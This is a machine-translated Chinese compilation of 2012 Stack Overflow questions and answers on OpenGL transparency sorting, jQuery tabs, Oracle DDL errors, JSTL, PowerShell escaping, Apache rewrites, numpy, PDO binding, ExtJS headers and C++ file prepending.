没有正确的顺序。您需要将至少一个四边形分成两部分——这就是像构建 BSP 树这样的提前计划要做的事情。这就是存在深度缓冲的原因。在大多数几何体不透明的基础上按像素解决这个问题。

所以最好的方法是：

*   为您的透明几何构建 BSP 树（以获得完全准确性）；
*   为透明几何构建每个对象的 BSP 树，将对象从后到前排序（以获得相当好的准确性）；
*   要求对象仅具有或多或少的凸透明段，因此如果您构建一个具有单叶的 BSP 树，则最终会得到一个 BSP 树，从前到后排序（为了合理的准确性，取决于您的艺术）；
*   在绘制了所有不透明的几何图形后（用于不同的外观但没有排序问题），使用加法混合并以任何顺序绘制深度注销。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-26T21:14:18.747

首先，**不，没有办法让 OpenGL 为你做这件事**。您必须根据当前相机和模型位置（即模型视图矩阵）手动对透明几何图形进行排序。

为了实现这一点，在实时实现中，您通常不会对单个三角形进行排序，而是对其逻辑子集（网格、子网格）进行排序。问题案例则变为：

*   单个渲染元素中的非凸几何体。通常通过预先手动拆分几何图形或忽略工件来解决。
*   不同元素的相交几何。一般不解决。

在性能方面，重要的是，在构建场景时，将元素分为（部分）透明与不透明。这样可以避免大型排序操作，因为您只需要对透明几何进行排序。

**先进技术**

对于完全不同的方法，请查看*深度剥离*和类似技术。如果做得好，这些技术可以提供很多东西。但是，我不知道实际实现它们的任何 OpenGL *ES*标题。这并不意味着它不是一个选择。

**然而...**

如果您对一般的 3D 编程还不是很熟悉，我强烈建议您坚持手动排序并尝试将伪影减少到最低限度。通过这种方式，您可以做出明智的决定，无论这种实现是否足以满足您的特定情况。

如果不出意外，实现这些东西将自动赋予您超人的能力，即在您以后玩的每个视频游戏中立即发现（并被极大地分散注意力）与透明度相关的渲染问题。有一个了不起的技能。

# jquery - 按下按钮时生成 jquery 选项卡

> ID：13572961
> 
> 赞同：0
> 
> 时间：2012-11-26T20:52:15.697
> 
> 标签：jquery

我试图在按下包含 div 的按钮时生成选项卡（也可以关闭）。目前我用来生成 div 的是：

```
function addStream(name) {

    if ($("#stream_"+name)[0]!=null) { return; };
    var d=$("<div></div>");
    $(d).attr("id", "stream_"+name);
    $(d).attr("class", "container_small");
    $(d).append("<iframe width='560' height='340' style='border: 0; outline=0' frameborder='0' scrolling='no' src='http://cdn.livestream.com/embed/"+name+"?layout=4&amp;height=340;width=560&amp;autoplay=false'></iframe>");
    $(d).append("<iframe width='300' height='340' style='border: 0; outline=0' frameborder='0' scrolling='no' src='http://cdn.livestream.com/embed/"+name+"?layout=6&amp;height=400&amp;width=300&amp;showTimestamp=true'></iframe>");
    $(d).append("<br><div style=\"display: inline-block; margin: 4px;\"><input type=\"button\" value=\"close\" onclick='removeStream(\""+name+"\")'></input></div>");
    $("#view").append(d);
} 
```

Id 就像在可关闭选项卡中的此信息一样。请原谅我的基本知识；我还在学习。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T21:00:14.980

你看过[jQueryUI 选项卡小部件](http://api.jqueryui.com/tabs/)吗？

如果你还没有：停止你正在做的一切，并在你的服务器上测试运行示例。为什么要重新制造轮子，尤其是这样一个结构良好的轮子？

# sql - Oracle 名称已在使用中

> ID：13572966
> 
> 赞同：0
> 
> 时间：2012-11-26T20:52:27.663
> 
> 标签：sql, oracle

我有一个正在为作业运行的脚本，如下所示：

```
drop table burger_king_locations_clean;
drop table burger_king_locations_unresolv;

create table burger_king_locations_clean
(
    ...
);  

create table burger_king_locations_unresolv
(
    ....
); 
```

但是当我运行它时，我收到以下消息并且我不明白，因为我知道表已经消失并且没有视图或具有该名称的任何其他对象。

```
Table dropped.

drop table burger_king_locations_unresolv
           *
ERROR at line 1:
ORA-00942: table or view does not exist

Table created.

Table created.

create table burger_king_locations_unresolv
             *
ERROR at line 1:
ORA-00955: name is already used by an existing object 
```

我不明白，因为这个确切的东西以前工作过，但我把我的电脑置于睡眠模式，然后又回到这个状态，现在它根本不起作用。有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T22:03:47.733

> “我有一个正在运行的家庭作业脚本，看起来像这样”

所以你说。但是发布的输出显示了两个 DROP 语句的执行，其中一个失败，两个 CREATE 语句，其中一个运行了两次。

为什么`drop table burger_king_locations_unresolv;`失败了？谁能告诉？也许你已经放弃了它，也许之前的创建失败了。

同样，我们不可能告诉你为什么 `create table burger_king_locations_unresolv`跑了两次。也许您的脚本在分号后面有一个反斜杠。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T21:03:21.490

你不需要清理桌子吗？

```
drop table burger_king_locations_clean PURGE;
drop table burger_king_locations_unresolv PURGE; 
```

# jsp - JSTL 在另一个变量中标记变量

> ID：13572979
> 
> 赞同：1
> 
> 时间：2012-11-26T20:52:57.397
> 
> 标签：jsp, jstl, jsp-tags, jspx

基本上，我正在尝试这样做：`${ ${var} }`.

我有以下内容：

```
<c:set var="x1" value="value1"/>
<c:set var="value1" value="x2"/> 
```

我的目标是使用`x1`来获取`x2`. 在运行时，我不知道`value1`. 所以，我的第一个猜测是`${ ${x1} }`= `${ value1 }`= `x2`。但是，这不起作用。我如何完成这项任务？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T21:04:42.057

我很难理解为什么以及何时这应该有用，但我认为`${pageScope[x1]}`应该有效。

`${}`表示解释大括号内的 JSP EL 表达式。并且`${}`不是 JSP EL 操作符，所以不能在里面使用`${}`。

# c# - 在 C# powershell 运行空间中转义单引号

> ID：13572982
> 
> 赞同：0
> 
> 时间：2012-11-26T20:53:06.103
> 
> 标签：c#, powershell, escaping, exchange-server, cmdlet

我正在尝试使用 C# 中的 System.Automation dll 运行 Exchange cmdlet。

在[http://technet.microsoft.com/en-us/library/dd315325.aspx](http://technet.microsoft.com/en-us/library/dd315325.aspx)中，他们说为了转义单引号，我们基本上需要在它后面加上另一个单引号

例如，

```
[PS] C:\Windows\system32>Write-Host 'Live and let le''arn'
Live and let le'arn 
```

但是，当我尝试用我的 cmdlet 做同样的事情时，

```
New-Mailbox -Name 'user1.''.cn' 
```

新邮箱实际创建的名称为user.''.cn。我们希望它是 user.'.cn 执行此 cmdlet 的代码如下：

```
AutomatedRunspace.Command command = new AutomatedRunspace.Command(cmdlet.Command);

foreach (CmdletParameter param in cmdlet.GetParameters())
{
    command.Parameters.Add(param.Name, param.Value);
}
pipeline.Commands.Add(command); 
```

我们能做些什么来正确地逃避它吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T21:17:49.187

在 C# 中调用 cmdlet 时，还需要担心 C# 字符串引用行为。您的问题不清楚您在 C# 代码中将 Name 参数设置为什么。我会试试这个：

```
string nameArg = "user1.'.cn"; 
```

也就是说，PowerShell API 应该绕过参数解析阶段，因为您直接通过 API 提供参数。

# rest - Apache2重写网址

> ID：13572988
> 
> 赞同：0
> 
> 时间：2012-11-26T20:53:44.560
> 
> 标签：rest, mod-rewrite, apache2

我对这些 apache2 重写感到困惑。

我需要制作一个 REST 接口，当然我会在其中使用真实的 URL。我在本地主机 atm 进行测试。

```
http://localhost/ssase12/services/users/
http://localhost/ssase12/services/users 
```

应该发送到

```
http://localhost/index.php?rt=index/users 
```

所以我需要检测 3\. 文件夹/名称并将其重定向到上面的链接 - users = $1。

有意义吗？我试图用放置在用户文件夹中的 .htaccess 来做到这一点......我可以从服务文件夹中做到这一点吗？所以一切都写在之后

```
http://localhost/ssase12/services/blah(/) 
```

也会发送吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-27T11:25:00.680

您可以将规则放在文档根目录中

```
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^ssase12/services/(.*?)/?$ /index.php?rt=index/$1 [L] 
```

或 ssase12 目录：

```
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^services/(.*?)/?$ /index.php?rt=index/$1 [L] 
```

或服务目录。

```
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*?)/?$ /index.php?rt=index/$1 [L] 
```

# python - 使用 numpy.loadtxt，如何将 .txt 文件中的字符串转换为整数值/浮点数？

> ID：13572991
> 
> 赞同：0
> 
> 时间：2012-11-26T20:53:48.987
> 
> 标签：python, file, text, numpy

所以，我有一个要读入 Pylab 的 .txt 文件。问题是，当我尝试使用 时`numpy.loadtxt("filename.txt")`，Pylab 无法将文件中数组中的数字读取为浮点值（它返回错误：`cannot convert string to float`.）。

我不确定我上面的语法是否有问题；当我删除括号内的引号时`numpy.loadtxt(filename.txt)`，Pylab 返回错误：未定义文件名。

有关如何将保存在 .txt 文件中的一系列数字作为浮点数组读入 Pylab 的任何建议？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-29T06:20:58.663

您需要在`filename.txt`文件中提供示例行。我想您可能需要阅读`numpy.loadtxt` [此处](http://docs.scipy.org/doc/numpy/reference/generated/numpy.loadtxt.html)的文档。文档页面上有一些很好的例子。

顺便说一句，第二个命令`numpy.loadtxt(filename.txt)`是错误的，因为您没有定义变量`filename`。

# php - 当绑定变量的数量是动态的时，解决绑定变量和令牌之间的不平等问题。(PDO/PHP MySQL)

> ID：13572992
> 
> 赞同：1
> 
> 时间：2012-11-26T20:53:50.487
> 
> 标签：php, mysql, sql, database, pdo

**语境：**

我正在尝试使用通常的 UPDATE 语法，通过将令牌绑定到数据的 PDO 方法，使用 MySQL 数据库中的一组值来更新记录。

**问题：**

要更新的字段数是动态的，并根据已发布到页面的数据进行调整。使用 an`if(isset($_POST[]))`过滤掉可能已经包含数据的字段的更新，但我不想被空数据覆盖。

这意味着我创建的令牌数量不同，但我将数据绑定到令牌的语法是静态的，我不确定如何调整它。

这当然会导致：`SQLSTATE[HY093]: Invalid parameter number: number of bound variables does not match number of tokens`

**我的代码：**

请注意 $data 是我数据库中所有列名的数组。它也是可以发布的变量的名称属性集，因此 $_POST[x] 应该更新到给定记录中的列 x，并且 x 是 $data 的成员。

```
$sql_b =    "UPDATE `temp_data` SET ";  
            foreach($data as $value)
            {
            if(isset($_POST[$value]))
            $sql_b .="$value = :$value, ";
            }

            $sql_b = rtrim($sql_b,', ');    
            $sql_b .=" WHERE UID = '$uid'";

try     
{
$pdo = new PDO('mysql:host=localhost; dbname=db01', $username, $password);
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);   
$stmt = $pdo->prepare($sql_b);

foreach($data as $value)
{
$stmt->bindParam(":$value", $_POST[$value]);
}

$stmt->bindParam(":sv_215_hidden", $_POST[sv_215_hidden]);
$stmt->bindParam(":sv_216_hidden", $_POST[sv_216_hidden]);

$stmt->execute(); 
```

# 受影响的行？回声 $stmt->rowCount(); // 1 } catch(PDOException $e) { echo 'Error: ' . $e->getMessage(); }

**为了突出这方面的问题：**

这段代码：

```
foreach($data as $value)
            {
            if(isset($_POST[$value]))
            $sql_b .="$value = :$value, ";
            } 
```

创建可能的 UPDATE 请求的子集

这段代码在哪里：

```
foreach($data as $value)
{
$stmt->bindParam(":$value", $_POST[$value]);
} 
```

始终在所有可能的标记之间创建一整套绑定。

**中心问题：**

如何调整绑定数量以仅匹配正在更新的字段？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T21:12:49.650

你已经在那里了；您正在检查生成 SQL 语句时设置了哪些字段：

```
foreach($data as $value)
        {
        if(isset($_POST[$value]))
        $sql_b .="$value = :$value, ";
        } 
```

因此，您可以在调用时使用完全相同的逻辑`bindParam()`：

```
foreach($data as $value)
        {
        if(isset($_POST[$value]))
        $stmt->bindParam(":$value", $_POST[$value]);
        } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T21:15:26.327

我认为你需要做几个额外的步骤：

```
$keys = array('foo', 'bar', 'baz', 'foobar');
$updates = array();
$bound = array();
foreach($keys as $key){
    if (isset($_POST[$key])){
        $updates[] = $key . '= :' . $key;
        $bound[':' . $key] = $_POST[$key];
    }
}
$sql = 'UPDATE table SET ' . implode(',', $updates) . ' WHERE etc'; //add your where clause
$stmt = $pdo->prepare($sql);
$stmt->execute($bound); 
```

换句话说，您可以将一组绑定参数传递给 PDOStatement::execute，而不是事先单独绑定它们；并按上述方式执行操作以确保绑定参数与您的 SQL 中的内容相匹配。

# asp.net - ExtJs 在“Ext.form.field.file”上提交时发送错误的标头

> ID：13572993
> 
> 赞同：3
> 
> 时间：2012-11-26T20:53:52.670
> 
> 标签：asp.net, extjs, http-headers

所以如上所述，我通过 ExtJs 使用`Ext.form.field.file`. 但是，当我这样做时，它会发送以下 header `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8`。这导致我的后端（ASP.NET）出现问题，认为 HTML 是预期的，在 JSON 周围放置标签，导致响应返回时出现问题（尚未得到如何在 ASP.NET 端解决此问题的答案在 ExtJs 端或在 ASP.NET 控制器中发送请求时，有谁知道如何修改此标头？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-27T02:51:05.080

正如 Neil 所提到的，它实际上期望 HTML 返回，因为它使用隐藏的 iFrame 来完成它的工作。[http://docs.sencha.com/ext-js/4-1/#!/api/Ext.form.Basic-method-hasUpload](http://docs.sencha.com/ext-js/4-1/#!/api/Ext.form.Basic-method-hasUpload)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-27T01:36:41.707

您可以在提交表单时指定要发送的标题，如下所示：

```
your_form.submit({
    url: 'file-upload',
    method: 'POST',
    headers: { Accept : 'what you want' }, 
    success: ....
}); 
```

我没有测试，但我很确定它有效。

# c++ - 在文件开头写入，保留文件内容

> ID：13572999
> 
> 赞同：4
> 
> 时间：2012-11-26T20:54:14.087
> 
> 标签：c++, ofstream

我有一个要写的文本文件。我想始终保留文件内容。我想在“FIFO”之后写（最后一次写总是在文件的第一行）。

我尝试使用`fout.open("filename");`with ate 模式来保留文件内容，然后`seekg(0)`尝试将光标收回到文件的开头。没用。

我发现这样做的独特方式我认为它非常耗时，将所有文件内容复制到临时文件中。写我想写，然后在目标文件末尾写临时文件的内容。

必须有一种简单的方法来执行此操作吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-26T21:02:01.167

Jorge，无论如何你都必须重写内存中的整个文件。您不能简单地将文件保留在原处并预先添加内存，特别是因为它是一个简单的文本文件（也许如果有某种形式的元数据，您可以......）

无论如何，您最好的机会是将旧内容刷新到一个临时位置，写下您需要的内容并附加旧内容。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T21:38:22.380

我不确定你在问什么。如果要在文件开头*添加*一行，唯一的方法是打开一个新的临时文件，写入该行，将旧文件复制到新行之后，然后删除旧文件并重命名临时文件。

如果原始行的长度是固定的，并且您想替换它，那么您所要做的就是使用 `ios_base::in`和来打开文件`ios_base::out`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-26T21:54:52.720

首先，您应该意识到文件在历史上是流，即它们只能在一个方向上读取和写入。这来自文件存储在磁带上的时代，磁带可以朝一个方向移动（当时）。

但是，如果您只想*前置*，那么您可以将文件*向后*存储。听起来很傻？也许吧，但这只需一点点开销。

除此之外，对于当前的操作系统，您将需要制作一个副本以进行前置。虽然文件不再是流，并且可以在硬盘上随机访问，但它们仍然会朝着一个方向增长。当然，您可以创建一个文件系统，文件在其中双向增长，但我还没有听说过。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-08-21T08:34:41.763

使用 <fstream> 您可以使用 filebuf 类。

```
 filebuf myfile;
    myfile.open ("test.txt", ios::in | ios::out);
    if (!myfile.is_open()) cout << "cannot open" << endl;
    myfile.sputn("AAAA", 4);
    myfile.close();

    filebuf myfile2;
    myfile2.open ("test.txt", ios::in | ios::out);
    if (!myfile2.is_open()) cout << "cannot open 2" << endl;
    myfile2.sputn("BB", 2);
    myfile2.close(); 
```

* * *

## 回答 #5

> 赞同：-4
> 
> 时间：2012-11-26T20:58:04.310

按您想要的顺序写入字符串，然后刷新到文件